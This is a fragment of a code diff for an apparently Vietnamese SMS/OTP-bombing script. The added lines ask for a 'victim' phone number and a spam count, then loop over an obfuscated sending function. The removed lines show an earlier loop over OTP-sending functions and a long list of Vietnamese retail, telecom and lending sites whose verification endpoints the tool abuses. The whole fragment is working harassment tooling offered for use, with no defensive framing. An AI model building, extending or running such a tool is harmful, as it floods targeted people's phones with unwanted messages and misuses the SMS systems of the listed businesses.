+        print(f"\033[44mVui lòng chờ {j} giây", end="\r")
+        time.sleep(1)
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("⚠️ Thiếu số điện thoại.")
-        sys.exit(1)
+    phone = input("=> nhập sdt nạn nhân!:")
+  
+    count = int(input("=> Nhập số lần spam!: "))
+    for i in range(1, count + 1):
+        LJJJJLJIJLLJLJILJLIILLIIL(phone, i)
 
-    phone = sys.argv[1]
-    repeat_count = int(sys.argv[2]) if len(sys.argv) > 2 else 1
-    delay = 0.2  # giãn cách gửi
-
-    from spam_list import otp_functions  # nếu bạn định nghĩa ở chỗ khác
-
-    for i in range(repeat_count):
-        print(f"📨 Vòng spam {i+1}")
-        for func in otp_functions:
-            send_otp_with_delay(func, phone)
-
-
-# https://www.sapo.vn
-# https://viettel.vn x3
-# https://medicare.vn
-# https://tv360.vn
-# https://www.dienmayxanh.com
-# https://kingfoodmart.com/
-# https://video.mocha.com.vn
-# https://fptplay.vn x2 1 cái quên pass 1 cái tạo acc
-# https://vieon.vn/
-# https://sso.ghn.vn/register
-# https://www.lottemart.vn/
-# https://vayvnd.vn/
-# https://shopee.vn/
-# https://www.thegioididong.com
-# https://fptshop.com.vn
-# https://winmart.vn/
-# https://vietloan.vn
-# https://lozi.vn
-# https://f88.vn
-# https://lozi.vn/
-# https://spacet.vn/
-# https://booking.vinpearl.com/
-# https://www.traveloka.com
-# https://dongplus.vn
-# https://nhathuoclongchau.com.vn
-# https://galaxyplay.vn/
-# https://emartmall.com.vn/
-# https://app.ahamove.com
-# viettelpay.vn # lấy api qua app
-# https://www.taxixanhsm.vn # lấy api qua app x2 do cả zalo và sms
-# https://id.acheckin.vn/ #1
-# https://appota.com/
-# get ở app Watsons VN
-# https://hoang-phuc.com/
-# fm.com.vn
-# https://reebok.com.vn/
-# https://thefaceshop.com.vn/
-# https://beautybox.com.vn/
-# https://winmart.vn/
-# https://medicare.vn/login#
-# https://futabus.vn/dang-nhap
-# https://viettelpost.com.vn/
-# https://tokyolife.vn/#
-# https://30shine.com/
-# https://www.cathaylife.com.vn
-# https://dominos.vn
-# https://new.vinamilk.com.vn
-# send_otp_via_vietloan2 # vietloan.vn
-# https://batdongsan.com.vn
-# https://gumac.vn
-# https://mutosi.com/
-# https://vietair.com.vn/
-# https://www.fahasa.com/
-# https://shopiness.vn/
-# mocha35 get ở app
-# bibabo.vn get app
-# moca.vn
-# pantio.vn
-# https://routine.vn/
-# https://vayvnd.vn/
-# https://moneygo.vn/
-# https://pico.vn
-# https://www.pnj.com.vn/
-# https://prod-tini-id.nkidworks.com/auth/tinizen
